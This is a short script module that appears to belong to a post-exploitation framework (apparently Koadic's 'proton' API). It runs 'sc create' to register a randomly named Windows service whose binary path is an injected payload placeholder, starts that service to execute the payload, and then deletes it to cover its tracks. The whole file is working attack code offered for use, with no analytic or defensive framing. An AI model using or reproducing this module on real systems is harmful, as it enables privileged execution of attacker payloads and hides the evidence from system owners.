try
{
    proton.shell.run("sc create #random# binpath= \"~PAYLOAD_DATA~\"", true);
    proton.shell.run("sc start #random#", true);
    proton.shell.run("sc delete #random#", true);
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
